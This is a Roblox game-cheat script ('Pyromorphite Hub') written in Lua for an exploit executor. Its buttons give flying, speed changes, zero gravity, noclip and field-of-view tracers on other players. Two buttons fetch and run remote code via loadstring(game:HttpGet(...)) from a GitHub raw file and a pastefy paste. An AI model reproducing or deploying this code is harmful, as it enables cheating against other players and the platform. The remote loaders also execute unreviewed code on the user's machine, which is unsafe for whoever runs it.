local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PyromorphiteHub"
gui.ResetOnSpawn = false

-- tbutton
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 40, 0, 40)
toggleButton.Position = UDim2.new(0.5, 0, 0.5, 0) 
toggleButton.AnchorPoint = Vector2.new(0.5, 0.5)
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.Text = "P"
toggleButton.TextColor3 = Color3.fromRGB(0, 255, 0)
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.TextSize = 24
toggleButton.ZIndex = 10
toggleButton.BorderSizePixel = 2
toggleButton.BorderColor3 = Color3.fromRGB(0, 255, 0)
toggleButton.Active = true
toggleButton.Draggable = true
toggleButton.Parent = gui

local toggleCorner = Instance.new("UICorner", toggleButton)
toggleCorner.CornerRadius = UDim.new(1, 0)

-- gui
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 0, 0, 0)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Visible = false

local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 12)
frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
frame.Active = true
frame.Draggable = true

-- title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = ""
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 22

-- buttons
local function createButton(text, pos, alignLeft)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0.4, 0, 0, 40)
	button.Position = alignLeft and UDim2.new(0.1, 0, 0, pos) or UDim2.new(0.5, 0, 0, pos)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.Text = text
	button.TextColor3 = Color3.fromRGB(0, 255, 0)
	button.Font = Enum.Font.SourceSansBold
	button.TextSize = 20
	button.BorderSizePixel = 2
	button.BorderColor3 = Color3.fromRGB(0, 255, 0)
	local corner = Instance.new("UICorner", button)
	corner.CornerRadius = UDim.new(0, 8)
	button.Parent = frame
	return button
end

local btn1 = createButton("P Fly Gui", 40, true)
local btn2 = createButton("Fling Gui", 90, true)
local btn3 = createButton("add speed", 140, true)
local btn4 = createButton("decrease speed", 190, true)

local btn5 = createButton("no gravity", 40, false)
local btn6 = createButton("noclip", 90, false)
local btn7 = createButton("1PCTracers", 140, false)
local btn8 = createButton("Troll GUI", 190, false)
btn1.MouseButton1Click:Connect(function()
	print("1button pressed")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")
local camera = workspace.CurrentCamera

local flying = false
local bv, bg = nil, nil
local speed = 60
local verticalDirection = 0

-- gui
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "FlightGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 160, 0, 130)
frame.Position = UDim2.new(0, 30, 0.5, -70)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
frame.Active = true
frame.Draggable = true

local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(1, -10, 0, 30)
toggleBtn.Position = UDim2.new(0, 5, 0, 5)
toggleBtn.Text = "Toggle Fly"
toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleBtn.BorderColor3 = Color3.fromRGB(0, 255, 0)
toggleBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
toggleBtn.Font = Enum.Font.SourceSansBold
toggleBtn.TextScaled = true

local upBtn = Instance.new("TextButton", frame)
upBtn.Size = UDim2.new(1, -10, 0, 30)
upBtn.Position = UDim2.new(0, 5, 0, 40)
upBtn.Text = "↑ Up"
upBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
upBtn.BorderColor3 = Color3.fromRGB(0, 255, 0)
upBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
upBtn.Font = Enum.Font.SourceSansBold
upBtn.TextScaled = true

local downBtn = Instance.new("TextButton", frame)
downBtn.Size = UDim2.new(1, -10, 0, 30)
downBtn.Position = UDim2.new(0, 5, 0, 75)
downBtn.Text = "↓ Down"
downBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
downBtn.BorderColor3 = Color3.fromRGB(0, 255, 0)
downBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
downBtn.Font = Enum.Font.SourceSansBold
downBtn.TextScaled = true

local destroyBtn = Instance.new("TextButton", frame)
destroyBtn.Size = UDim2.new(1, -10, 0, 25)
destroyBtn.Position = UDim2.new(0, 5, 1, -30)
destroyBtn.Text = "Destroy GUI"
destroyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
destroyBtn.BorderColor3 = Color3.fromRGB(0, 255, 0)
destroyBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
destroyBtn.Font = Enum.Font.SourceSansBold
destroyBtn.TextScaled = true

-- ff
local function toggleFly()
	flying = not flying
	if flying then
		bv = Instance.new("BodyVelocity")
		bv.Velocity = Vector3.zero
		bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
		bv.Parent = hrp

		bg = Instance.new("BodyGyro")
		bg.MaxTorque = Vector3.new(1, 1, 1) * 1e6
		bg.CFrame = hrp.CFrame
		bg.P = 10000
		bg.Parent = hrp
	else
		if bv then bv:Destroy() end
		if bg then bg:Destroy() end
	end
end

toggleBtn.MouseButton1Click:Connect(toggleFly)
destroyBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
	if bv then bv:Destroy() end
	if bg then bg:Destroy() end
	flying = false
end)

-- hotkey
UIS.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.R then
		toggleFly()
	end
end)

-- UDbuttons
upBtn.MouseButton1Down:Connect(function() verticalDirection = 1 end)
upBtn.MouseButton1Up:Connect(function() verticalDirection = 0 end)
downBtn.MouseButton1Down:Connect(function() verticalDirection = -1 end)
downBtn.MouseButton1Up:Connect(function() verticalDirection = 0 end)

-- sycle
RunService.RenderStepped:Connect(function()
	if flying and bv and bg then
		local move = humanoid.MoveDirection
		local cam = camera.CFrame
		local final = (move + Vector3.new(0, verticalDirection, 0))

		if final.Magnitude > 0 then
			bv.Velocity = final.Unit * speed
		else
			bv.Velocity = Vector3.zero
		end

		bg.CFrame = CFrame.new(hrp.Position, hrp.Position + cam.LookVector)
	end
end)
	-- code
end)

btn2.MouseButton1Click:Connect(function()
	print("2button pressed")
loadstring(game:HttpGet("https://raw.githubusercontent.com/LiarRise/FLN-X/refs/heads/main/README.md"))()
	-- code
end)

btn3.MouseButton1Click:Connect(function()
	print("3button pressed")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

getgenv().walkSpeedBoost = (getgenv().walkSpeedBoost or 16) + 25

-- speed giving
Humanoid.WalkSpeed = getgenv().walkSpeedBoost
print("walkspeed:", Humanoid.WalkSpeed)
	-- code 
end)

btn4.MouseButton1Click:Connect(function()
	print("4button pressed")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

getgenv().walkSpeedBoost = (getgenv().walkSpeedBoost or 16) - 25

-- giving speed
Humanoid.WalkSpeed = getgenv().walkSpeedBoost

print("walkspeed:", Humanoid.WalkSpeed)
	-- code
end)
btn5.MouseButton1Click:Connect(function()
	print("5button pressed")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local plr = Players.LocalPlayer
local normalGravity = workspace.Gravity

workspace.Gravity = 0

local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
if humanoid then
	humanoid.Sit = true
	task.wait(0.1)
	humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)

	for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
		v:Stop()
	end
end

UserInputService.JumpRequest:Connect(function()
	workspace.Gravity = normalGravity
end)
	-- code
end)

btn6.MouseButton1Click:Connect(function()
	print("6button pressed")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "NoclipMiniButton"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Name = "NoclipButton"
button.Parent = gui
button.Size = UDim2.new(0, 50, 0, 50)
button.Position = UDim2.new(0.5, 0, 0.5, 0)
button.BackgroundColor3 = Color3.new(0, 0, 0)
button.Text = "D"
button.TextColor3 = Color3.fromRGB(0, 255, 0)
button.Font = Enum.Font.SourceSansBold
button.TextScaled = true
button.AutoButtonColor = true
button.BorderSizePixel = 0
button.Active = true
button.Draggable = true
button.ClipsDescendants = true


local round = Instance.new("UICorner")
round.CornerRadius = UDim.new(1, 0) -- полностью круглая
round.Parent = button

local noclip = false
local noclipConnection

button.MouseButton1Click:Connect(function()
	noclip = not noclip

	if noclip then
		noclipConnection = RunService.Stepped:Connect(function()
			for _, part in ipairs(player.Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CanCollide = false
				end
			end
		end)
		button.TextColor3 = Color3.fromRGB(0, 255, 0) -- зелёный
	else
		if noclipConnection then
			noclipConnection:Disconnect()
		end
		button.TextColor3 = Color3.fromRGB(0, 125, 0)
	end
end)
	-- code
end)

btn7.MouseButton1Click:Connect(function()
	print("7button pressed")


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- settings
local FOV_ANGLE = math.rad(110)
local FOV_RANGE = 30
local SEGMENTS = 12
local HEIGHT_OFFSET = -1.5

local visualizers = {}
local visualEnabled = true

-- tbuttons gui
local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
gui.Name = "FOVGui"
gui.ResetOnSpawn = false

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 120, 0, 40)
toggleButton.Position = UDim2.new(0, 10, 0, 10)
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
toggleButton.TextColor3 = Color3.new(0, 0, 0)
toggleButton.Text = "Turn off 1PCT"
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.TextSize = 20
toggleButton.Parent = gui
toggleButton.BackgroundTransparency = 0.1
toggleButton.BorderSizePixel = 0
toggleButton.AutoButtonColor = true

-- tracers creating
local function createVisualizer()
	local parts = {}
	for _ = 1, SEGMENTS do
		local wedge = Instance.new("WedgePart")
		wedge.Anchored = true
		wedge.CanCollide = false
		wedge.Material = Enum.Material.Neon
		wedge.Color = Color3.fromRGB(0, 255, 0)
		wedge.Transparency = 0.25
		wedge.CastShadow = false
		wedge.Name = "FOVTracer"
		wedge.Parent = Workspace
		table.insert(parts, {wedge = wedge})
	end
	return parts
end

-- FOV reboot 
local function updateVisualizer(player)
	if not visualEnabled then return end
	if player == LocalPlayer then return end
	if not player.Character or not player.Character:FindFirstChild("Head") then return end

	local head = player.Character.Head
	local hrp = player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local parts = visualizers[player]
	if not parts then
		parts = createVisualizer()
		visualizers[player] = parts
	end

	local cameraCF = player == LocalPlayer and Camera.CFrame or nil
	local isObserved = Camera.CameraSubject and Camera.CameraSubject:IsDescendantOf(player.Character)

	local viewCF, origin

	if isObserved then
		viewCF = Camera.CFrame
		origin = viewCF.Position
	else
		viewCF = head.CFrame
		origin = head.Position
	end

	origin += Vector3.new(0, HEIGHT_OFFSET, 0)

	local startAngle = -FOV_ANGLE / 2
	for i = 1, SEGMENTS do
		local angle1 = startAngle + (i - 1) * (FOV_ANGLE / SEGMENTS)
		local angle2 = startAngle + i * (FOV_ANGLE / SEGMENTS)

		local rot1 = viewCF * CFrame.Angles(0, angle1, 0)
		local rot2 = viewCF * CFrame.Angles(0, angle2, 0)

		local dir1 = rot1.LookVector
		local dir2 = rot2.LookVector
		local midDir = (dir1 + dir2).Unit

		local length = FOV_RANGE
		local width = length * math.tan(FOV_ANGLE / SEGMENTS)

		local wedge = parts[i].wedge
		wedge.Size = Vector3.new(width * 1.2, 0.5, length) 
		wedge.CFrame = CFrame.new(origin + midDir * (length / 2), origin) * CFrame.Angles(math.rad(-90), 0, 0)

		-- trace lines
		local function updateLine(name, from, to)
			local beam = parts[i][name]
			if not beam then
				local part = Instance.new("Part")
				part.Anchored = true
				part.CanCollide = false
				part.Transparency = 0
				part.Size = Vector3.new(0.1, 0.1, 0.1)
				part.Material = Enum.Material.Neon
				part.Color = Color3.fromRGB(0, 255, 0)
				part.Name = name
				part.Parent = Workspace
				parts[i][name] = part
				beam = part
			end

			local distance = (from - to).Magnitude
			beam.Size = Vector3.new(0.05, 0.05, distance)
			beam.CFrame = CFrame.new((from + to) / 2, to) * CFrame.Angles(0, math.pi, 0)
		end

		local leftPoint = wedge.Position + (wedge.CFrame.RightVector * wedge.Size.X / 2)
		local rightPoint = wedge.Position - (wedge.CFrame.RightVector * wedge.Size.X / 2)
		updateLine("Line1", leftPoint, head.Position + Vector3.new(0, 0.25, 0))
		updateLine("Line2", rightPoint, head.Position + Vector3.new(0, 0.25, 0))
	end
end

-- tracers destroy when exit
local function onPlayerRemoving(player)
	if visualizers[player] then
		for _, obj in ipairs(visualizers[player]) do
			if obj.wedge then obj.wedge:Destroy() end
			if obj.Line1 then obj.Line1:Destroy() end
			if obj.Line2 then obj.Line2:Destroy() end
		end
		visualizers[player] = nil
	end
end

-- tracers destroy 
local function clearAllVisuals()
	for _, parts in pairs(visualizers) do
		for _, obj in ipairs(parts) do
			if obj.wedge then obj.wedge:Destroy() end
			if obj.Line1 then obj.Line1:Destroy() end
			if obj.Line2 then obj.Line2:Destroy() end
		end
	end
	visualizers = {}
end

-- tbutton
toggleButton.MouseButton1Click:Connect(function()
	visualEnabled = not visualEnabled
	toggleButton.Text = visualEnabled and "Turn off 1PCT" or "Turn on 1PCT"
	toggleButton.BackgroundColor3 = visualEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 125, 0)

	if not visualEnabled then
		clearAllVisuals()
	end
end)

-- tracing reload
RunService.RenderStepped:Connect(function()
	if visualEnabled then
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				updateVisualizer(player)
			end
		end
	end
end)

Players.PlayerRemoving:Connect(onPlayerRemoving)

	-- code
end)

btn8.MouseButton1Click:Connect(function()
	print("8button pressed")
loadstring(game:HttpGet("https://pastefy.app/rmdi1m55/raw"))()
	-- code
end)


-- anims
local targetSize = UDim2.new(0, 300, 0, 250)
local targetPos = UDim2.new(0.5, 0, 0.5, 0)
local isOpen = false
local isTweening = false

local function typewriteText(label, fullText, delayTime)
	label.Text = ""
	for i = 1, #fullText do
		label.Text = string.sub(fullText, 1, i)
		task.wait(delayTime)
	end
end

local function openGUI()
	if isTweening then return end
	isTweening = true
	frame.Visible = true
	frame.Size = UDim2.new(0, 0, 0, 0)
	frame.Position = targetPos

	local tweenOpen = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = targetSize
	})

	tweenOpen:Play()
	tweenOpen.Completed:Connect(function()
		task.wait(0.1)
		typewriteText(title, "Pyromorphite Hub", 0.05)
		isTweening = false
	end)
end

local function closeGUI()
	if isTweening then return end
	isTweening = true

	local hideTween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
		Size = UDim2.new(0, 0, 0, 0)
	})
	hideTween:Play()
	hideTween.Completed:Connect(function()
		frame.Visible = false
		title.Text = ""
		isTweening = false
	end)
end

toggleButton.MouseButton1Click:Connect(function()
	if isTweening then return end
	if isOpen then
		closeGUI()
	else
		openGUI()
	end
	isOpen = not isOpen
end) 